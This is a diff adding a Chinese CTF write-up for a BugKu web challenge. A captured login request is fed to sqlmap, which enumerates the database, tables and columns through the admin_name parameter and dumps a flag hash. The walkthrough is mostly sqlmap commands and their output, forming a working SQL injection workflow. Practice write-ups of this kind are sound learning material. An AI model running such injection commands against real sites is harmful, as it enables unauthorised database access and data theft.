@@ -1,5 +1,65 @@
 web部分的37-50题
 
+# 这是一个神奇的登陆框
+
+首先进行抓包，如上图所示，输入admin和123456，保存为1.txt，放在 E:\杂\c加加 目录下，然后用`sqlmap`进行注入。
+
+```bash
+# 使用下面的命令爆破出了数据库名称为 bugkusql1
+sqlmap>sqlmap.py -r "E:\杂\c加加\1.txt" -p admin_name --dbs
+
+# 结果
+available databases [2]:
+[*] bugkusql1
+[*] information_schema
+```
+
+```bash
+# 使用下面的命令进行爆表
+sqlmap>sqlmap.py -r "E:\杂\c加加\1.txt" -D bugkusql1 -p admin_name --tables
+
+# 结果
+Database: bugkusql1
+[2 tables]
++--------+
+| flag1  |
+| whoami |
++--------+
+```
+
+```bash
+# 使用下面的命令爆列名
+sqlmap>sqlmap.py -r "E:\杂\c加加\1.txt" -D bugkusql1 -T flag1 -p admin_name --columns
+
+# 结果
+Database: bugkusql1
+Table: flag1
+[1 column]
++--------+-------------+
+| Column | Type        |
++--------+-------------+
+| flag1  | varchar(50) |
++--------+-------------+
+```
+
+```bash
+# 使用下面的命令查字段
+
+sqlmap>sqlmap.py -r "E:\杂\c加加\1.txt" -D bugkusql1 -T flag1 -C flag1 -p admin_name --dump
+
+# 结果
+Database: bugkusql1
+Table: flag1
+[1 entry]
++----------------------------------+
+| flag1                            |
++----------------------------------+
+| ed6b28e684817d9efcaf802979e57aea |
++----------------------------------+
+```
+
+爆出了flag。
+
 # PHP_encrypt_1(ISCCCTF)
 
 题目给了一段密文：fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=
